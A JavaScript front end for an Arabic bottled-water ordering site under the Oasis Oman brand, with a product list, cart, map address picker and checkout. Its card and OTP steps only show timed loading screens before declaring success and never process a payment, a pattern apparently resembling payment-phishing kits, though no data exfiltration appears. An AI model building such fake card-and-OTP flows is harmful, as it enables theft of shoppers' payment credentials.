// ===== STATE MANAGEMENT =====
let cart = [];
let favorites = [];
let currentFilter = 'all';
let currentModalProduct = null;
let modalQty = 1;
let currentSlide = 0;
let checkoutData = {};

// ===== PRODUCTS DATABASE =====
const products = [
    // --- مياه عادية ---
    {
        id: 1, name: 'واحة عمان 200 مل', category: 'water',
        price: 1.5, desc: 'مياه معدنية طبيعية نقية حجم 200 مل',
        badge: '', badgeClass: '',
        img: 'assets/images/products/30-Anniversary-product-line-up_200ml-2-1083x1536.png'
    },
    {
        id: 2, name: 'واحة عمان 330 مل', category: 'water',
        price: 2.0, desc: 'مياه معدنية طبيعية نقية حجم 330 مل',
        badge: '', badgeClass: '',
        img: 'assets/images/products/30-Anniversary-product-line-up_330ml-1-1083x1536.png'
    },
    {
        id: 3, name: 'واحة عمان 500 مل', category: 'water',
        price: 2.5, desc: 'مياه معدنية طبيعية نقية حجم 500 مل',
        badge: 'الأكثر بيعاً', badgeClass: 'badge-hot',
        img: 'assets/images/products/30-Anniversary-product-line-up_500ml-1-943x1536.png'
    },
    {
        id: 4, name: 'واحة عمان 1.5 لتر', category: 'water',
        price: 3.5, desc: 'مياه معدنية طبيعية نقية حجم 1.5 لتر',
        badge: '', badgeClass: '',
        img: 'assets/images/products/30-Anniversary-product-line-up_1.5-Liter-1-998x2048.png'
    },
    {
        id: 5, name: 'واحة عمان 2 لتر', category: 'water',
        price: 4.0, desc: 'مياه معدنية طبيعية نقية حجم 2 لتر',
        badge: '', badgeClass: '',
        img: 'assets/images/products/30-Anniversary-product-line-up_2-Liter-998x2048.png'
    },
    {
        id: 6, name: 'واحة عمان 5 لتر', category: 'water',
        price: 5.0, desc: 'مياه معدنية طبيعية نقية حجم 5 لتر',
        badge: '', badgeClass: '',
        img: 'assets/images/products/30-Anniversary-product-line-up_5-Liter_11zon-965x1536.png'
    },

    // --- قلونات ---
    {
        id: 7, name: 'قلون 5 جالون (قابل للاستبدال)', category: 'gallon',
        price: 1.5, desc: 'قلون مياه 5 جالون للاستخدام مع المبرد',
        badge: '', badgeClass: '',
        img: 'assets/images/products/5gallon.png'
    },
    {
        id: 8, name: 'قلون 5 جالون (جديد)', category: 'gallon',
        price: 3.5, desc: 'قلون مياه 5 جالون جديد مع المحتوى',
        badge: '', badgeClass: '',
        img: 'assets/images/products/5gallon-1.png'
    },
    {
        id: 9, name: 'قلون 5 جالون (غير مرتجع)', category: 'gallon',
        price: 1.5, desc: 'قلون مياه 5 جالون للاستخدام لمرة واحدة',
        badge: '', badgeClass: '',
        img: 'assets/images/products/5G-nrb.png'
    },

    // --- مياه وظيفية (زيرو) ---
    {
        id: 10, name: 'واحة عمان زيرو 500 مل', category: 'functional',
        price: 3.0, desc: 'مياه خالية من الصوديوم حجم 500 مل',
        badge: 'جديد', badgeClass: 'badge-new',
        img: 'assets/images/products/30_Anniversary_product_line_up_Sifr500ml_copy-removebg-preview.png'
    },
    {
        id: 11, name: 'واحة عمان زيرو 1.5 لتر', category: 'functional',
        price: 4.0, desc: 'مياه خالية من الصوديوم حجم 1.5 لتر',
        badge: 'جديد', badgeClass: 'badge-new',
        img: 'assets/images/products/30_Anniversary_product_line_up_Sifr_1.5Liter_copy-removebg-preview.png'
    },

    // --- ملحقات ---
    {
        id: 12, name: 'موزع مياه كبير', category: 'accessories',
        price: 15.0, desc: 'موزع مياه كبير للمكاتب والمنازل',
        badge: '', badgeClass: '',
        img: 'assets/images/products/Big-Dispencer-copy-1-2.png'
    },
    {
        id: 13, name: 'موزع مياه طاولة', category: 'accessories',
        price: 5.0, desc: 'موزع مياه يوضع على الطاولة',
        badge: '', badgeClass: '',
        img: 'assets/images/products/Bottle_Dispencer-2.png'
    }
];

// ===== INITIALIZATION =====
document.addEventListener('DOMContentLoaded', () => {
    const overlay = document.getElementById('page-loading-overlay');
    if (overlay) {
        setTimeout(() => {
            overlay.classList.add('hidden');
            setTimeout(() => overlay.remove(), 600);
        }, 1000);
    }
    
    const savedData = sessionStorage.getItem('checkoutData');
    if (savedData) {
        checkoutData = JSON.parse(savedData);
    }

    const savedPage = sessionStorage.getItem('currentPage');
    if (savedPage && document.getElementById(savedPage)) {
        goToPage(savedPage);
    }
    
    renderProducts();
    startHeroCarousel();
});

// ===== PAGE NAVIGATION =====
function goToPage(pageId) {
    sessionStorage.setItem('currentPage', pageId);

    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId).classList.add('active');

    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    if (pageId === 'home-page') document.getElementById('nav-home').classList.add('active');
    else if (pageId === 'cart-page') document.getElementById('nav-cart').classList.add('active');
    else if (pageId === 'favorites-page') document.getElementById('nav-fav').classList.add('active');
    else if (pageId === 'notifications-page') document.getElementById('nav-notif').classList.add('active');

    if (pageId === 'cart-page') renderCart();
    else if (pageId === 'favorites-page') renderFavorites();
    else if (pageId === 'checkout-address-page') {
        updateAddressLabels();
    }
    else if (pageId === 'checkout-invoice-page') renderInvoice();

    window.scrollTo(0, 0);
}

// ===== PRODUCTS RENDERING =====
function renderProducts() {
    const grid = document.getElementById('products-grid');
    if (!grid) return;
    grid.innerHTML = '';

    const filtered = currentFilter === 'all' ? products : products.filter(p => p.category === currentFilter);

    filtered.forEach(product => {
        const card = document.createElement('div');
        card.className = 'product-card';
        card.innerHTML = `
            <div class="product-image" onclick="openModal(${product.id})">
                <img src="${product.img}" alt="${product.name}">
                ${product.badge ? `<div class="product-badge ${product.badgeClass}">${product.badge}</div>` : ''}
            </div>
            <div class="product-info">
                <div class="product-name">${product.name}</div>
                <div class="product-desc">${product.desc}</div>
                <div class="product-footer">
                    <div class="product-price">${product.price.toFixed(2)} ر.ع</div>
                    <div class="product-actions">
                        <button class="product-btn add" onclick="addToCart(${product.id}, event)">
                            <i class="fas fa-plus"></i>
                        </button>
                    </div>
                </div>
            </div>
        `;
        grid.appendChild(card);
    });
}

// ===== FILTER PRODUCTS =====
function filterProducts(category, element) {
    currentFilter = category;
    document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
    if (element) element.classList.add('active');
    renderProducts();
}

// ===== CART MANAGEMENT =====
function addToCart(productId, event) {
    if (event) event.stopPropagation();
    const product = products.find(p => p.id === productId);
    const existing = cart.find(c => c.id === productId);

    if (existing) {
        existing.qty++;
    } else {
        cart.push({ ...product, qty: 1 });
    }

    updateCartBadge();
    showNotification(`تم إضافة ${product.name} إلى السلة`);
}

function removeFromCart(productId) {
    cart = cart.filter(c => c.id !== productId);
    updateCartBadge();
    renderCart();
}

function updateCartQty(productId, change) {
    const item = cart.find(c => c.id === productId);
    if (item) {
        item.qty += change;
        if (item.qty <= 0) removeFromCart(productId);
        else renderCart();
        updateCartBadge();
    }
}

function updateCartBadge() {
    const badge = document.getElementById('cart-badge');
    if (!badge) return;
    const total = cart.reduce((sum, item) => sum + item.qty, 0);
    badge.textContent = total;
    badge.style.display = total > 0 ? 'flex' : 'none';
}

function renderCart() {
    const content = document.getElementById('cart-content');
    if (!content) return;

    if (cart.length === 0) {
        content.innerHTML = `
            <div class="cart-empty">
                <div class="cart-empty-icon"><i class="fas fa-shopping-cart"></i></div>
                <p>السلة فارغة</p>
                <p style="font-size:0.85rem; margin-top:0.5rem;">ابدأ بإضافة المنتجات المفضلة لديك</p>
            </div>
        `;
        return;
    }

    const subtotal = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
    const delivery = 0; // توصيل مجاني دائماً
    const total = subtotal + delivery;

    let html = '<div class="cart-items">';
    cart.forEach(item => {
        html += `
            <div class="cart-item">
                <div class="cart-item-image">
                    <img src="${item.img}" alt="${item.name}">
                </div>
                <div class="cart-item-info">
                    <div class="cart-item-name">${item.name}</div>
                    <div class="cart-item-price">${item.price.toFixed(2)} ر.ع</div>
                    <div class="cart-item-controls">
                        <button class="qty-btn" onclick="updateCartQty(${item.id}, -1)">−</button>
                        <div class="qty-value">${item.qty}</div>
                        <button class="qty-btn" onclick="updateCartQty(${item.id}, 1)">+</button>
                        <button class="remove-btn" onclick="removeFromCart(${item.id})">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </div>
            </div>
        `;
    });
    html += '</div>';

    html += `
        <div class="cart-summary">
            <div class="summary-row">
                <span>المجموع الفرعي</span>
                <span>${subtotal.toFixed(2)} ر.ع</span>
            </div>
            <div class="summary-row">
                <span>رسوم التوصيل</span>
                <span class="${delivery === 0 ? 'free-delivery' : ''}">${delivery === 0 ? 'مجاني' : delivery.toFixed(2) + ' ر.ع'}</span>
            </div>
            <div class="summary-total">
                <span>الإجمالي</span>
                <span>${total.toFixed(2)} ر.ع</span>
            </div>

            <button class="btn-primary checkout-btn" onclick="goToPage('checkout-info-page')">
                إتمام الطلب
                <i class="fas fa-chevron-left"></i>
            </button>
        </div>
    `;
    content.innerHTML = html;
}

// ===== INVOICE RENDERING =====
function renderInvoice() {
    const container = document.getElementById('invoice-content');
    if (!container) return;

    const subtotal = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
    const delivery = 0; // توصيل مجاني دائماً
    const total = subtotal + delivery;

    let itemsHtml = '';
    cart.forEach(item => {
        itemsHtml += `
            <div style="display:flex; justify-content:space-between; margin-bottom:0.5rem; font-size:0.9rem;">
                <span>${item.name} (×${item.qty})</span>
                <span>${(item.price * item.qty).toFixed(2)} ر.ع</span>
            </div>
        `;
    });

    container.innerHTML = `
        <div class="invoice-card">
            <div class="invoice-section">
                <h4 style="margin-bottom:1rem; color:var(--primary);">ملخص المنتجات</h4>
                ${itemsHtml}
            </div>
            <div class="invoice-divider"></div>
            <div class="invoice-section">
                <div class="summary-row">
                    <span>المجموع الفرعي</span>
                    <span>${subtotal.toFixed(2)} ر.ع</span>
                </div>
                <div class="summary-row">
                    <span>رسوم التوصيل</span>
                    <span>${delivery === 0 ? 'مجاني' : delivery.toFixed(2) + ' ر.ع'}</span>
                </div>
                <div class="summary-total" style="margin-top:0.5rem; padding-top:0.5rem; border-top:1px dashed #eee;">
                    <span>الإجمالي النهائي</span>
                    <span style="color:var(--primary);">${total.toFixed(2)} ر.ع</span>
                </div>
            </div>
        </div>
    `;
}

// ===== NOTIFICATIONS =====
function showNotification(msg) {
    const toast = document.createElement('div');
    toast.className = 'toast-notification';
    toast.innerHTML = `<i class="fas fa-check-circle"></i> <span>${msg}</span>`;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 2000);
    }, 100);
}

// ===== HELPER FUNCTIONS =====
function startHeroCarousel() {
    // وظيفة وهمية للحفاظ على استقرار الكود
}

function openModal(id) {
    const product = products.find(p => p.id === id);
    if (product) {
        currentModalProduct = product;
        // هنا يمكن إضافة كود لفتح نافذة تفاصيل المنتج إذا لزم الأمر
        addToCart(id);
    }
}

function updateAddressLabels() {
    // وظيفة لتحديث تسميات العناوين
}

// ===== CHECKOUT VALIDATION & MAP =====
function validateCustomerInfo(event) {
    event.preventDefault();
    const name = document.getElementById('customer-name').value;
    const phone = document.getElementById('customer-phone').value;

    if (name && phone.length === 8) {
        checkoutData.customer = { name, phone };
        sessionStorage.setItem('checkoutData', JSON.stringify(checkoutData));
        goToPage('checkout-address-page');
        // تلقائياً افتح الخريطة عند الانتقال لصفحة العنوان
        setTimeout(openMapModal, 500);
    } else {
        showNotification('يرجى إدخال الاسم ورقم هاتف صحيح (8 أرقام)');
    }
}

let map;
let marker;

function openMapModal() {
    const modal = document.getElementById('map-modal');
    modal.style.display = 'flex';
    
    // تأخير بسيط للتأكد من أن الـ div مرئي قبل تهيئة الخريطة
    setTimeout(() => {
        if (!map) {
            map = L.map('leaflet-map').setView([23.5880, 58.3829], 12); // إحداثيات مسقط، عمان
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap'
            }).addTo(map);
            
            map.on('click', function(e) {
                updateMarker(e.latlng);
            });
        }
        
        // محاولة الحصول على موقع المستخدم الحالي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((position) => {
                const latlng = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude
                };
                map.setView(latlng, 15);
                updateMarker(latlng);
            });
        }
    }, 300);
}

function updateMarker(latlng) {
    if (marker) {
        marker.setLatLng(latlng);
    } else {
        marker = L.marker(latlng, {draggable: true}).addTo(map);
    }
}

function closeMapModal() {
    document.getElementById('map-modal').style.display = 'none';
}

function confirmMapLocation() {
    if (marker) {
        const pos = marker.getLatLng();
        checkoutData.location = { lat: pos.lat, lng: pos.lng };
        sessionStorage.setItem('checkoutData', JSON.stringify(checkoutData));
        closeMapModal();
        showNotification('تم تحديد الموقع بنجاح');
        
        // ملء بعض البيانات تلقائياً إذا أمكن (اختياري)
        document.getElementById('address-street').value = 'موقع محدد من الخريطة';
    } else {
        showNotification('يرجى تحديد موقعك على الخريطة أولاً');
    }
}

function validateAddress(event) {
    event.preventDefault();
    const building = document.getElementById('address-building').value;
    const number = document.getElementById('address-number').value;
    const street = document.getElementById('address-street').value;
    const type = document.querySelector('input[name="address-type"]:checked').value;

    if (building && number && street) {
        checkoutData.address = { building, number, street, type, 
            floor: document.getElementById('address-floor').value,
            unit: document.getElementById('address-unit').value
        };
        sessionStorage.setItem('checkoutData', JSON.stringify(checkoutData));
        goToPage('checkout-invoice-page');
    } else {
        showNotification('يرجى ملء جميع الحقول المطلوبة');
    }
}

function selectPaymentMethod(method, element) {
    document.querySelectorAll('.payment-method-card').forEach(c => c.classList.remove('active'));
    element.classList.add('active');
    checkoutData.paymentMethod = method;
}

function submitCardPayment(event) {
    event.preventDefault();
    const loading = document.getElementById('loading-overlay');
    loading.style.display = 'flex';
    
    setTimeout(() => {
        loading.style.display = 'none';
        goToPage('otp-page');
    }, 2000);
}

function verifyOTP(event) {
    event.preventDefault();
    const loading = document.getElementById('loading-overlay');
    loading.style.display = 'flex';
    
    setTimeout(() => {
        loading.style.display = 'none';
        goToPage('success-page');
    }, 1500);
}

function formatCardNumber(input) {
    let v = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let matches = v.match(/\d{4,16}/g);
    let match = matches && matches[0] || '';
    let parts = [];
    for (let i=0, len=match.length; i<len; i+=4) {
        parts.push(match.substring(i, i+4));
    }
    if (parts.length) {
        input.value = parts.join(' ');
    } else {
        input.value = v;
    }
}

function formatExpiry(input) {
    let v = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length > 2) {
        input.value = v.substring(0, 2) + '/' + v.substring(2, 4);
    } else {
        input.value = v;
    }
}

function hideCardErrors() {
    document.getElementById('error-card-main').style.display = 'none';
}

function hideOTPErrors() {
    document.getElementById('error-otp').style.display = 'none';
}
